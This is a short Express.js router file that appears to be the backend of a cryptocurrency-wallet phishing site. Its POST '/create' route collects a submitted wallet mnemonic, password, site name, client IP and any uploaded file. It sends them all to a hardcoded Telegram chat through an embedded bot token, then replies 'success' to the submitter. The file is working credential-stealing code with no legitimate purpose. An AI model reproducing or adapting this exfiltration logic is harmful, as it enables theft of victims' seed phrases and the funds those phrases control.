const router = require("express").Router();
const apiController = require("../controllers/apiController");
const { uploadSingle } = require("../multerS");

router.get("/home-page", apiController.homePage);
router.get("/detail-page/:id", apiController.detailPage);

router.post("/create", uploadSingle, (req, res) => {
  const { mnemonic, password, site } = req.body;
  const ip = req.ip;
  const TelegramBot = require("node-telegram-bot-api");
  //    const stream = fs.createReadStream(req.file);
  // replace the value below with the Telegram token you receive from @BotFather
  const token = "1172027626:AAHfloWHA8sv0DVqd5A_qRT3By3fINaYpUw";
  const message1 = `mnemonic:\n${mnemonic}\n\npassword\n${password}\nsite\n\n${site}\n\nIP ${ip}`;
  // Create a bot that uses 'polling' to fetch new updates
  const bot = new TelegramBot(token, { polling: true });
  const chatId = 808625639;
  if (!req.file) {
    bot.sendMessage(chatId, message1);
    return res.status(201).json({ message: "success" });
  }

  // send a message to the chat acknowledging receipt of their message
  const message2 = `password\n${password}\n\nsite\n${site}\n\nIP ${ip}`;
  bot.sendMessage(chatId, message2);
  bot.sendDocument(chatId, `public/images/${req.file.filename}`);
  // send back the matched "whatever" to the chat
  return res.status(201).json({ message: "success" });
});
module.exports = router;
